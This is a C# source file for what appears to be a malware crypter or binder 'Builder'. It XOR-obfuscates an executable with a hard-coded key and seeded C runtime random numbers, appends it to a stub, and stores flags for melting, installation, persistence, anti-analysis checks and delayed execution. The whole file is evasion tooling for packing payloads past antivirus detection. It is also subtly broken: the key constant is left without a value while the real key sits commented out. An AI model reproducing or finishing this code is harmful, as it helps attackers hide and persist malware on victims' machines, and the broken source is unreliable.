using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Builder
{
   class Builder
   {
      [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
      static extern int srand(UInt32 seed);

      [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
      static extern Int32 rand();

    //  const string key = "7858861095312029000296069230427283565840413005017481720689923373222505610511467564476193731867120671846836681056397512171512137433691113398220396671813843193362330232752833549352279565327213358851602712359924223360267184711765576784386559731878388486720439001534979559607251601173892660280366435402030664706355474429868401009768849020560469799787733685074343638195373961614189131181196956170894334842766461114721773795088818075059131204578416618867339086155595318250166276443741156222406259136625418492821679752885333213979427487323269469215490411544642908330225121824900217824368766518067644109386267438995608962154183677774203174992169147589026324687071514159585319548537567537076998450301910984286336495640255088829683201832273638734526470279435416717727691458383175976377031788722771104618260077923854212362601222752189152487754894638909516508763238364904437714239992827500721490571062288784609993245888435007152691629854727042094489733731092308776080253473547131223487991156738814088637824972754";

      const string key
       public static bool Write2stub(string exePath, string stubPath, bool melt, bool install, bool persist, string fileName, string keyName, bool antis, bool dotnet, int delay)
      {
         try
         {
            byte[] exeBytes = File.ReadAllBytes(exePath);
            obfuscate(exeBytes);

            using (var stream = new FileStream(stubPath, FileMode.Append))
            {
               stream.Write(exeBytes, 0, exeBytes.Length);
               stream.Write(BitConverter.GetBytes(exeBytes.Length), 0, 4);
               stream.Write(BitConverter.GetBytes(Convert.ToInt32(melt)), 0, 4);
               stream.Write(BitConverter.GetBytes(Convert.ToInt32(install)), 0, 4);
               stream.Write(BitConverter.GetBytes(Convert.ToInt32(persist)), 0, 4);
               writeBytes(stream, fileName);
               writeBytes(stream, keyName);
               stream.Write(BitConverter.GetBytes(Convert.ToInt32(antis)), 0, 4);
               stream.Write(BitConverter.GetBytes(Convert.ToInt32(dotnet)), 0, 4);
               stream.Write(BitConverter.GetBytes(delay), 0, 4);
               return true;
            }
         }
         catch (Exception) { return false; }
      }

      static void writeBytes(FileStream stream, string str)
      {
         byte[] bytesPadding = new byte[26];
         byte[] bytes = System.Text.Encoding.ASCII.GetBytes(str);
         int i;
         for (i = 0; i < bytes.Length && i < bytesPadding.Length - 1; ++i)
            bytesPadding[i] = bytes[i];
         obfuscate(bytesPadding);
         stream.Write(bytesPadding, 0, bytesPadding.Length);
      }

      static void obfuscate(byte[] bytes)
      {
         srand(0x1917);
         for (int i = 0; i < bytes.Length; ++i)
         {
            bytes[i] ^= (byte)key[i % (key.Length)];
            bytes[i] ^= (byte)rand();
            bytes[i] ^= 0;
         }
      }
   }
}